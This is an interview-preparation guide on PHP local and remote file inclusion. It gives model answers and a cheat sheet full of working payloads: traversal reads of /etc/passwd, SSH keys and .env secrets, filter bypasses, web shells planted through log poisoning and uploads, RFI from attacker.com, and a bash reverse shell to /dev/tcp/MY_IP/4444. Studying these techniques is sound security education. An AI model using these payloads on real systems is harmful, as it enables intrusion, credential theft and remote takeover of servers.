# LFI and RFI (File Inclusion) — Interview Scenarios and Deep Explanations

> File inclusion is when the server loads a file based on user input.
> If you control WHICH file gets loaded, you control WHAT code gets executed.

---

## Table of Contents

1. [What Is LFI vs RFI](#what-is-lfi-vs-rfi)
2. [Scenario 1: Basic LFI Discovery](#scenario-1-basic-lfi-discovery-medium)
3. [Scenario 2: LFI with Path Traversal Filters](#scenario-2-lfi-with-path-traversal-filters-medium-hard)
4. [Scenario 3: LFI to Remote Code Execution](#scenario-3-lfi-to-remote-code-execution-hard)
5. [Scenario 4: RFI Attack](#scenario-4-rfi-attack-medium)
6. [Scenario 5: LFI via Log Poisoning](#scenario-5-lfi-via-log-poisoning-hard)
7. [Scenario 6: PHP Wrappers for LFI](#scenario-6-php-wrappers-for-lfi-hard)
8. [Scenario 7: Null Byte and Truncation](#scenario-7-null-byte-and-truncation-medium)
9. [Scenario 8: LFI in Non-Obvious Locations](#scenario-8-lfi-in-non-obvious-locations-medium-hard)
10. [Quick Recall Cheat Sheet](#quick-recall-cheat-sheet)

---

## What Is LFI vs RFI

### LFI — Local File Inclusion

The server includes a file that already EXISTS on the server.

```
Normal:  https://target.com/page?file=about.php
Attack:  https://target.com/page?file=../../../../etc/passwd
```

You are reading files FROM the server itself.

### RFI — Remote File Inclusion

The server includes a file from an EXTERNAL URL that you control.

```
Normal:  https://target.com/page?file=about.php
Attack:  https://target.com/page?file=https://evil.com/shell.txt
```

The server downloads and executes YOUR file from YOUR server.

### Key Differences

| | LFI | RFI |
|---|---|---|
| File location | On the target server | On attacker's server |
| Requires | Path traversal knowledge | allow_url_include = On (PHP) |
| Difficulty | More common, harder to get RCE | Less common, instant RCE |
| Impact | Read files, sometimes RCE | Almost always RCE |
| Detection | More steps needed | Easier to exploit |

### Why Does File Inclusion Happen?

Developers write code like this:

```php
// PHP
$page = $_GET['page'];
include($page);
```

```python
# Python
page = request.args.get('page')
return render_template(page)
```

```java
// Java
String page = request.getParameter("page");
RequestDispatcher rd = request.getRequestDispatcher(page);
rd.include(request, response);
```

The problem: user input directly controls which file the server loads and executes.

---

## Scenario 1: Basic LFI Discovery (Medium)

**Interviewer:** "You see a URL like `https://target.com/index.php?page=about.php`. How do you test for LFI?"

### Model Answer:

"The `page` parameter is loading a file on the server. I would test if I can control which file it loads.

**Step 1 — Understand the behavior:**
```
?page=about.php     → shows About page (normal)
?page=contact.php   → shows Contact page (normal)
?page=xyz.php       → error? blank? (tells me how errors are handled)
```

**Step 2 — Try path traversal to read a known file:**
```
Linux servers:
  ?page=../../../../etc/passwd
  ?page=../../../etc/passwd
  ?page=....//....//....//etc/passwd

Windows servers:
  ?page=..\..\..\..\windows\system32\drivers\etc\hosts
  ?page=....\\....\\....\\windows\win.ini
```

**Step 3 — Confirm LFI:**
If I see the contents of /etc/passwd (list of users) or win.ini, the server is including whatever file I specify.

**Step 4 — Understand what I can access:**
```
/etc/passwd          → user accounts on the system
/etc/shadow          → password hashes (usually need root)
/etc/hosts           → internal hostnames
/proc/self/environ   → environment variables (may contain secrets)
/var/www/html/.env   → application secrets, database passwords
/var/log/apache2/access.log  → web server logs (useful for log poisoning)
```

**Why I start with /etc/passwd:** It is world-readable on every Linux system. If I can read it, LFI is confirmed. It does not contain passwords (those are in /etc/shadow), so it is safe to test."

### Follow-ups:

**Q: "How many ../ do you need?"**

> "I do not need to know the exact depth. If I use too many ../ it does not matter — once you reach the root directory (/), extra ../ just stay at root. So `../../../../../../../../etc/passwd` works even if the app is only 2 directories deep. I always use 8-10 ../ to be safe."

**Q: "The page shows the file content but also adds .php at the end. So your path becomes /etc/passwd.php which does not exist. What now?"**

> "This is a common defense — the server appends an extension:
> ```php
> include($page . '.php');   // my input + .php
> ```
> I would try:
> 1. **Null byte (old PHP < 5.3.4):** `?page=../../../../etc/passwd%00` — the null byte terminates the string, .php is ignored
> 2. **Path truncation:** Send a very long path (4096+ chars) — the filesystem truncates it, dropping the .php
> 3. **PHP wrappers:** Use `php://filter` which does not care about appended extensions
> 4. **Double extension:** `?page=../../../../etc/passwd/.` — the trailing dot or slash might confuse the extension append"

---

## Scenario 2: LFI with Path Traversal Filters (Medium-Hard)

**Interviewer:** "The application strips `../` from your input. How do you bypass it?"

### Model Answer:

"If the filter removes `../` once, I have several bypass options:

**Bypass 1 — Double encoding:**
```
../     → URL encoded     → %2e%2e%2f
../     → Double encoded  → %252e%252e%252f
```
The WAF/filter sees encoded characters and does not recognize them as ../
The server decodes them and processes the path traversal.

**Bypass 2 — Nested traversal:**
```
....//   → filter removes ../ from the middle → leaves ../
....\/   → filter looks for ../ but this has ..\ mixed in
..../    → extra dot might confuse the filter
```
The filter removes `../` once, but the remaining characters form a new `../`.

**Bypass 3 — Backslash (Windows or some PHP configs):**
```
..\..\..\etc\passwd
..%5c..%5c..%5cetc%5cpasswd    (%5c = backslash)
```
Filter checks for `../` (forward slash) but not `..\` (backslash).

**Bypass 4 — URL encoding variations:**
```
..%2f           → %2f = /
%2e%2e/         → %2e = .
%2e%2e%2f       → all encoded
..%252f         → double encoded /
..%c0%af        → overlong UTF-8 encoding of /
..%ef%bc%8f     → Unicode full-width /
```

**Bypass 5 — Using absolute path:**
```
?page=/etc/passwd    → skip traversal entirely, use absolute path
```
Sometimes the filter only checks for `../` but if you provide an absolute path starting with `/`, no traversal is needed.

**Bypass 6 — PHP wrapper (avoid filesystem path entirely):**
```
?page=php://filter/convert.base64-encode/resource=/etc/passwd
```
Wrappers use a different mechanism than filesystem paths, so path traversal filters do not apply."

### Follow-ups:

**Q: "How do you know which bypass to try?"**

> "I test systematically:
> 1. First I try normal `../` to see what error I get
> 2. If it is stripped, I try `....//` (nested)
> 3. If that fails, I try URL encoding (`%2e%2e%2f`)
> 4. If that fails, I try double encoding (`%252e%252e%252f`)
> 5. If that fails, I try absolute path (`/etc/passwd`)
> 6. If all path-based approaches fail, I try PHP wrappers
>
> I change one thing at a time so I know exactly what the filter is blocking."

---

## Scenario 3: LFI to Remote Code Execution (Hard)

**Interviewer:** "You confirmed LFI — you can read files. But reading files is not RCE. How do you escalate to code execution?"

### Model Answer:

"LFI alone reads files. To get RCE, I need to make the server INCLUDE a file that contains MY code. Several methods:

**Method 1 — Log Poisoning (most common):**
```
Step 1: Put PHP code into a log file
  Send a request with malicious User-Agent:
  User-Agent: <?php system($_GET['cmd']); ?>
  
  This gets written to /var/log/apache2/access.log

Step 2: Include the log file via LFI
  ?page=../../../../var/log/apache2/access.log&cmd=whoami
  
  The server includes the log file, which contains my PHP code.
  The PHP code executes, running 'whoami'.
```

**Method 2 — PHP Session Files:**
```
Step 1: Set session data that contains PHP code
  Login with username: <?php system($_GET['cmd']); ?>
  This gets stored in /tmp/sess_[SESSION_ID]

Step 2: Include the session file
  ?page=../../../../tmp/sess_abc123def456&cmd=id
```

**Method 3 — /proc/self/environ (Linux):**
```
Step 1: Send request with malicious User-Agent header
Step 2: Include /proc/self/environ
  ?page=../../../../proc/self/environ
  
  This file contains environment variables including HTTP_USER_AGENT
  If the User-Agent contains PHP code, it executes.
```

**Method 4 — File upload + LFI combo:**
```
Step 1: Upload a file (image, document, anything)
  Even if the upload forces .jpg extension, the CONTENT can be PHP code

Step 2: Include the uploaded file via LFI
  ?page=../../../../var/www/uploads/my_image.jpg
  
  The server includes it, PHP engine executes the PHP code inside it,
  regardless of the .jpg extension.
```

**Method 5 — Email log (if SMTP is running):**
```
Step 1: Send email to a user on the server with PHP code in the body
Step 2: Include the mail log: /var/mail/www-data or /var/log/mail.log
```

The key insight: I need to get my PHP code INTO a file on the server through any channel, then use LFI to include and execute that file."

### Follow-ups:

**Q: "Why does including a .jpg file execute PHP code?"**

> "Because PHP's `include()` function does not care about the file extension. It reads the file content and looks for `<?php ... ?>` tags. If it finds them, it executes that code. Everything outside PHP tags is treated as plain text/HTML.
>
> So a file named `image.jpg` containing:
> ```
> [actual jpg binary data]
> <?php system('whoami'); ?>
> [more jpg binary data]
> ```
> When included, PHP ignores the binary data, finds the PHP tags, and executes the command. The file extension is completely irrelevant to PHP's include function."

---

## Scenario 4: RFI Attack (Medium)

**Interviewer:** "How does RFI differ from LFI in terms of exploitation, and how would you test for it?"

### Model Answer:

"RFI is when the server fetches and includes a file from a URL I control.

**Testing for RFI:**
```
Step 1: Set up a file on my server (attacker.com/shell.txt):
  <?php system($_GET['cmd']); ?>

  Note: I use .txt not .php so MY server does not execute it.
  The TARGET server will execute it.

Step 2: Include it via the vulnerable parameter:
  ?page=https://attacker.com/shell.txt&cmd=whoami
  ?page=http://attacker.com/shell.txt
  ?page=//attacker.com/shell.txt
```

**If direct URL is blocked, try:**
```
?page=https://attacker.com/shell.txt         → blocked?
?page=https://attacker.com/shell.txt%00      → null byte
?page=https://attacker.com/shell.txt?         → query string confusion
?page=https://attacker.com/shell.txt#         → fragment
?page=https://attacker.com@target.com/shell   → URL confusion
?page=http://127.0.0.1/shell.txt             → localhost (if file is uploaded)
?page=data://text/plain,<?php system('id'); ?>  → data wrapper
```

**Why RFI is rarer but more dangerous:**
```
Rarer:  PHP setting allow_url_include must be ON (default is OFF since PHP 5.2)
        Most modern servers have this disabled.

More dangerous: Instant RCE with no extra steps.
  LFI: find a file to include → poison it → include it (multiple steps)
  RFI: point to your server → code executes immediately (one step)
```

**How to detect which is possible:**
```
LFI test:  ?page=../../../../etc/passwd         → reads local file?
RFI test:  ?page=https://YOUR_SERVER/test.txt   → makes request to you?

Monitor your server: if you see an incoming request from the target's IP,
the server is fetching your file = RFI is possible.
```"

### Follow-ups:

**Q: "Why .txt and not .php for your shell file?"**

> "If I host shell.php on MY server, MY server's PHP engine will execute it before sending the response. The target server would receive the OUTPUT of the script, not the source code.
>
> With shell.txt, my server sends the raw PHP source code as plain text. The TARGET server's PHP engine then executes it.
>
> Alternative: I could configure my server to not execute PHP, or use a non-PHP web server like Python's SimpleHTTPServer."

---

## Scenario 5: LFI via Log Poisoning (Hard)

**Interviewer:** "Walk me through a complete log poisoning attack step by step."

### Model Answer:

"Log poisoning means injecting code into a server log file, then using LFI to include that log file and execute the code.

**Step 1 — Identify which logs I can read via LFI:**
```
Apache/Nginx access log:
  /var/log/apache2/access.log
  /var/log/nginx/access.log
  /var/log/httpd/access_log
  /usr/local/apache/logs/access_log

Apache/Nginx error log:
  /var/log/apache2/error.log
  /var/log/nginx/error.log

SSH auth log:
  /var/log/auth.log

Mail log:
  /var/log/mail.log

PHP session:
  /tmp/sess_[session_id]
  /var/lib/php/sessions/sess_[session_id]
```

Try each one via LFI until I find one I can read.

**Step 2 — Understand what gets logged:**
```
Apache access log format:
  IP - - [timestamp] "METHOD /path HTTP/1.1" status size "Referer" "User-Agent"

Example:
  192.168.1.5 - - [03/May/2026:10:30:15] "GET /index.php HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
```

The **User-Agent** is logged AND it is something I fully control.

**Step 3 — Inject PHP code via User-Agent:**
```
Using curl:
  curl -A "<?php system(\$_GET['cmd']); ?>" https://target.com/

Using Burp:
  GET / HTTP/1.1
  Host: target.com
  User-Agent: <?php system($_GET['cmd']); ?>
```

Now the access log contains:
```
192.168.1.5 - - [timestamp] "GET / HTTP/1.1" 200 1234 "-" "<?php system($_GET['cmd']); ?>"
```

**Step 4 — Include the log file via LFI:**
```
?page=../../../../var/log/apache2/access.log&cmd=whoami
```

The server includes the log file. PHP sees the `<?php ... ?>` tag inside it and executes it. The `cmd=whoami` parameter is passed to `system()`.

**Step 5 — Escalate to reverse shell:**
```
?page=../../../../var/log/apache2/access.log&cmd=bash -c 'bash -i >& /dev/tcp/MY_IP/4444 0>&1'
```

**Important warnings:**
- Only inject the payload ONCE. If the log file has syntax errors from bad injections, the whole include fails.
- Test your payload locally first.
- Large log files might cause timeout when included."

### Follow-ups:

**Q: "What if the access log is too large and times out?"**

> "Alternatives:
> 1. Use error log instead — it is usually much smaller
> 2. Trigger an error with PHP code in the URL path:
>    `GET /<?php system($_GET['cmd']); ?> HTTP/1.1`
>    This generates a 404 entry in the error log with my code
> 3. Use /proc/self/fd/X — these are file descriptors, some point to log files
> 4. Use PHP session files — much smaller than logs
> 5. Use /proc/self/environ — environment variables for current process"

**Q: "What if you poison the log but the PHP code appears as text, not executing?"**

> "This means the include is reading the file but not parsing PHP. Possible reasons:
> 1. The application uses `file_get_contents()` or `readfile()` instead of `include()` — these read content but do NOT execute PHP
> 2. The PHP code got HTML-encoded in the log (angle brackets became entities)
> 3. The log file has corrupted PHP tags from multiple injection attempts
>
> If the app uses `file_get_contents()`, I cannot get RCE via log poisoning. I would shift to reading sensitive files like .env, config files, and source code instead."

---

## Scenario 6: PHP Wrappers for LFI (Hard)

**Interviewer:** "What are PHP wrappers and how do you use them with LFI?"

### Model Answer:

"PHP wrappers are special protocols that PHP understands. Instead of reading a file from the filesystem, wrappers let me manipulate how data is read, encoded, or even injected.

**Wrapper 1 — php://filter (Read source code):**
```
?page=php://filter/convert.base64-encode/resource=index.php
```

This reads index.php but BASE64 ENCODES the output.

Why base64? Normally if I include a PHP file, the code EXECUTES and I see the output. With base64 encoding, the code is converted to a base64 string first, so it cannot execute. I get the raw source code.

```
Response: PD9waHAgaW5jbHVkZSgkX0dFVC...
Decode:   <?php include($_GET['page']); ...

Now I can read the application's source code and find more vulnerabilities.
```

**Wrapper 2 — php://input (Inject code via POST body):**
```
GET ?page=php://input HTTP/1.1
Content-Type: application/x-www-form-urlencoded

<?php system('whoami'); ?>
```

php://input reads from the HTTP request body. If the server includes php://input, it executes whatever PHP code I send in the POST body.

Requires: allow_url_include = On

**Wrapper 3 — data:// (Inject code inline):**
```
?page=data://text/plain,<?php system('whoami'); ?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTsgPz4=
```

The data wrapper embeds the content directly in the URL. The base64 version is useful for bypassing WAFs that block PHP tags in URLs.

Requires: allow_url_include = On

**Wrapper 4 — expect:// (Direct command execution):**
```
?page=expect://whoami
?page=expect://id
```

Directly executes a system command. Very rare — requires the expect extension to be installed (almost never is).

**Wrapper 5 — zip:// and phar:// (Include from archives):**
```
Step 1: Create a ZIP file containing a PHP shell
Step 2: Upload the ZIP (as an image or document)
Step 3: Include via wrapper:
  ?page=zip:///var/www/uploads/shell.zip%23shell.php
  ?page=phar:///var/www/uploads/shell.phar/shell.php
```

The server extracts and includes the PHP file from inside the archive.

**Wrapper 6 — file:// (Explicit local file):**
```
?page=file:///etc/passwd
```
Same as normal LFI but using the file protocol explicitly.

### Which Wrappers Need What Settings

| Wrapper | allow_url_fopen | allow_url_include | Notes |
|---------|:-:|:-:|---|
| php://filter | Does not need either | Does not need either | Always works! Best for reading source code |
| php://input | Not needed | ON required | Needs POST body |
| data:// | ON required | ON required | Inline code injection |
| expect:// | Not needed | Not needed | Needs expect extension (very rare) |
| zip:// / phar:// | Not needed | Not needed | Needs uploaded archive |
| file:// | Not needed | Not needed | Same as normal LFI |

**Key insight:** `php://filter` is the most useful because it ALWAYS works regardless of PHP settings. It lets you read source code, which often reveals database credentials, API keys, and other vulnerabilities."

---

## Scenario 7: Null Byte and Truncation (Medium)

**Interviewer:** "The server appends .php to your input. How do you still read /etc/passwd?"

### Model Answer:

"The code looks like:
```php
include($_GET['page'] . '.php');
```

So my input `../../../../etc/passwd` becomes `../../../../etc/passwd.php` which does not exist.

**Method 1 — Null byte injection (PHP < 5.3.4):**
```
?page=../../../../etc/passwd%00

%00 is a null byte. In C (which PHP is built on), null byte = end of string.
PHP sees: ../../../../etc/passwd[NULL].php
Filesystem sees: ../../../../etc/passwd (stops at null)
The .php extension is effectively cut off.
```

This was patched in PHP 5.3.4 (2010). Old servers are still vulnerable.

**Method 2 — Path truncation (PHP < 5.3):**
```
?page=../../../../etc/passwd/./././././././././...[repeat to 4096+ chars]

PHP has a maximum path length (4096 on Linux).
When the total path exceeds this limit, the extra .php at the end is cut off.
```

I pad the path with `/./` repeated hundreds of times until the total path length exceeds 4096 characters.

**Method 3 — Dot truncation (Windows):**
```
?page=../../../../etc/passwd...........

Windows truncates trailing dots.
The .php becomes part of the trailing dots and gets removed.
```

**Method 4 — Avoid the problem entirely with wrappers:**
```
?page=php://filter/convert.base64-encode/resource=index

The server makes it: php://filter/convert.base64-encode/resource=index.php
This actually WORKS — it reads index.php source code in base64.
The .php extension becomes part of the resource name.

So I READ THE APP SOURCE CODE, then find the DB password in it.
```

**Method 5 — Query string or fragment:**
```
?page=../../../../etc/passwd%3f        (%3f = ?)
?page=../../../../etc/passwd%23        (%23 = #)

Becomes: ../../../../etc/passwd?.php  or  ../../../../etc/passwd#.php
The ? makes .php look like a query string.
The # makes .php look like a fragment.
Some systems ignore everything after ? or # in file paths.
```"

---

## Scenario 8: LFI in Non-Obvious Locations (Medium-Hard)

**Interviewer:** "LFI is not always in a page parameter. Where else would you look?"

### Model Answer:

"File inclusion can hide in many places:

**1. Language/locale selectors:**
```
?lang=en          → loads en.php or locale/en/messages.php
?lang=../../../../etc/passwd%00
```

**2. Template/theme selectors:**
```
?theme=dark       → loads themes/dark/style.php
?theme=../../../../etc/passwd%00
```

**3. Cookie values:**
```
Cookie: language=en
The server might include a file based on cookie value.
Modify the cookie to a path traversal payload.
```

**4. User-Agent or other headers:**
```
Some applications log or include based on headers.
Rare, but test by putting traversal paths in headers.
```

**5. File download endpoints:**
```
/download?file=report.pdf
/download?file=../../../../etc/passwd
This might be directory traversal (file read) rather than inclusion.
Same payloads, different impact (read vs execute).
```

**6. Image/resource loading:**
```
/image?path=uploads/avatar.jpg
/image?path=../../../../etc/passwd
```

**7. Include via POST body:**
```
POST /render
body: template=welcome

Try: template=../../../../etc/passwd
```

**8. Configuration file references:**
```
?config=database
?module=payment
?plugin=analytics

Each loads a specific file. Try path traversal in each.
```

**How to find these systematically:**
1. Look at every parameter in every request (URL, POST body, cookies, headers)
2. Ask: could this parameter be a filename or path?
3. If the value looks like a filename (has extension, looks like a path), test it
4. Search JavaScript source for file-loading patterns: include, require, readFile, loadTemplate"

---

## Quick Recall Cheat Sheet

```
LFI DETECTION:
  ?page=../../../../etc/passwd             (Linux)
  ?page=..\..\..\..\windows\win.ini        (Windows)
  Use 8-10 ../ to be safe (extra ones do not hurt)

INTERESTING FILES TO READ:
  Linux:
    /etc/passwd                  → user accounts
    /etc/shadow                  → password hashes (needs root)
    /proc/self/environ           → environment variables
    /proc/self/cmdline           → how the process was started
    /var/www/html/.env           → application secrets
    /var/log/apache2/access.log  → for log poisoning
    ~/.ssh/id_rsa                → SSH private keys
    ~/.bash_history              → command history
  
  Windows:
    C:\windows\win.ini
    C:\windows\system32\drivers\etc\hosts
    C:\inetpub\wwwroot\web.config
    C:\xampp\apache\conf\httpd.conf

FILTER BYPASS:
  Nested:          ....//    ....\/
  URL encode:      %2e%2e%2f
  Double encode:   %252e%252e%252f
  Backslash:       ..\..\..\
  Absolute path:   /etc/passwd (no traversal needed)
  Wrapper:         php://filter (avoids path entirely)

EXTENSION BYPASS (.php appended):
  Null byte:       %00                  (PHP < 5.3.4)
  Truncation:      /./././ * 1000       (exceed 4096 chars)
  Wrapper:         php://filter         (extension becomes part of resource)

PHP WRAPPERS:
  Read source:     php://filter/convert.base64-encode/resource=FILE
  Code inject:     php://input + POST body       (needs allow_url_include)
  Inline inject:   data://text/plain,CODE         (needs allow_url_include)
  From archive:    zip:// or phar://              (needs uploaded archive)
  Command:         expect://COMMAND               (needs expect extension)

LFI TO RCE:
  1. Log poisoning  → inject in User-Agent → include log file
  2. Session files   → inject in session data → include /tmp/sess_ID
  3. /proc/self/environ → inject in headers → include environ file
  4. File upload + LFI → upload PHP in image → include uploaded file
  5. PHP wrappers    → php://input or data:// → direct code injection
  6. Email logs      → send email with PHP code → include mail log

RFI:
  ?page=https://attacker.com/shell.txt
  ?page=data://text/plain;base64,BASE64_ENCODED_PHP
  Requires: allow_url_include = On (default OFF since PHP 5.2)
  Use .txt on your server so YOUR server does not execute the code.
```

---

## Interview-Ready Summary

When asked about LFI/RFI, structure your answer:

> "File inclusion happens when user input controls which file the server loads.
>
> **For LFI,** I first confirm by trying to read /etc/passwd with path traversal. If there are filters, I bypass with encoding, nested traversal, or PHP wrappers. To escalate from file read to RCE, I use log poisoning — inject PHP code into the access log via User-Agent header, then include the log file via LFI. Alternatively, if I can upload any file, I include that file via LFI regardless of its extension.
>
> **For RFI,** I host a PHP shell on my server as a .txt file and point the include to my URL. This gives instant RCE but requires allow_url_include to be enabled, which is rare on modern servers.
>
> **The most versatile tool is php://filter** — it always works regardless of server settings and lets me read application source code, which usually reveals database credentials and other vulnerabilities I can chain."

---

> Practice: For each scenario, explain the FULL chain — from discovery to RCE.
> The interviewer wants to see you can go from "I found LFI" to "I have code execution" step by step.
